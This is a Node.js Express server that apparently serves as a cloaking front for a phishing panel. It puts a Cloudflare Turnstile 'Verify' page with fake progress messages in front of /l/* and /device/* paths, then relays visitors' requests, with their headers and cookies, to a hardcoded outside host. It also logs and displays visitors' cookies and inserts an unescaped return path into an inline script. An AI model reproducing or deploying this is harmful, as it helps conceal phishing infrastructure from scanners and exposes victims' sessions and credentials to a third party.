const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const port = process.env.PORT || 3000;

app.set('trust proxy', 1);

const PANEL = 'portal42-343.sbs';
const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// ---- DEBUG PAGE ----
app.get('/debug', (req, res) => {
    res.send(`
        <h1>Debug</h1>
        <p>Cookies: ${JSON.stringify(req.cookies)}</p>
        <p>captcha_passed: ${req.cookies.captcha_passed ? 'YES' : 'NO'}</p>
        <p><a href="/">Home</a></p>
    `);
});

// ---- CAPTCHA PAGE ----
app.get('/captcha', (req, res) => {
    let returnPath = req.query.return || '/';
    if (returnPath.startsWith('//')) returnPath = returnPath.replace(/^\/+/, '/');
    if (!returnPath.startsWith('/')) returnPath = '/' + returnPath;
    res.send(getCaptchaHTML(SITE_KEY, returnPath));
});

// ---- PROTECTED ROUTES - redirect to CAPTCHA ----
app.get('/l/*', (req, res) => {
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
});
app.get('/device/*', (req, res) => {
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
});

// ---- PROXY WITH LOGGING ----
app.use('/l/*', async (req, res) => {
    console.log('Cookies received:', req.cookies); // Log to Render logs
    if (!req.cookies.captcha_passed) {
        console.log('Cookie missing, redirecting to CAPTCHA');
        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
    }
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const response = await fetch(target.toString(), { method: req.method, headers });
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

app.use('/device/*', async (req, res) => {
    if (!req.cookies.captcha_passed) {
        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
    }
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        const response = await fetch(target.toString(), { method: req.method, headers });
        const body = await response.text();
        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

// ---- ALL OTHER PATHS – 404 ----
app.use('*', (req, res) => {
    res.status(404).send('Not Found');
});

app.listen(port, () => console.log('✅ Proxy running on port ' + port));

function getCaptchaHTML(siteKey, returnPath) {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify</title>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
    #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
    #dp { margin-top: 20px; color: #555; }
    .error { color: #d32f2f; padding: 10px; background: #ffebee; border-radius: 4px; display: none; }
  </style>
</head>
<body>
  <div class="container">
    <div id="loadingLogo"> ... </div>
    <div id="dp"></div>
    <div id="cf-turnstile"></div>
    <div id="status" class="error"></div>
  </div>
  <script>
    const returnPath = "${returnPath}";
    const messages = ["Loading...", "Processing request...", "Preparing results...", "Almost there...", "Finalizing..."];
    let idx = 0;
    const dp = document.getElementById('dp');
    dp.textContent = messages[0];
    setInterval(() => { dp.textContent = messages[idx]; idx = (idx+1)%messages.length; }, 3000);

    function setCookie(name, value, minutes) {
        const expires = new Date(Date.now() + minutes * 60000).toUTCString();
        document.cookie = name + '=' + value + '; expires=' + expires + '; path=/; Secure; SameSite=Lax';
    }

    function turnstileCallback(token) {
        if (token) {
            setCookie('captcha_passed', 'true', 5);
            window.location.href = returnPath;
        }
    }

    function turnstileErrorCallback() {
        document.getElementById('status').textContent = 'Error. Please refresh.';
        document.getElementById('status').style.display = 'block';
        setTimeout(() => window.location.reload(), 2000);
    }
    function turnstileExpiredCallback() {
        if (window.turnstile) turnstile.reset();
        document.getElementById('status').textContent = 'Expired. Try again.';
        document.getElementById('status').style.display = 'block';
    }
    function onTurnstileLoad() {
        turnstile.render('#cf-turnstile', {
            sitekey: '${siteKey}',
            theme: 'light',
            callback: turnstileCallback,
            'error-callback': turnstileErrorCallback,
            'expired-callback': turnstileExpiredCallback,
        });
    }
  </script>
</body>
</html>
    `;
}
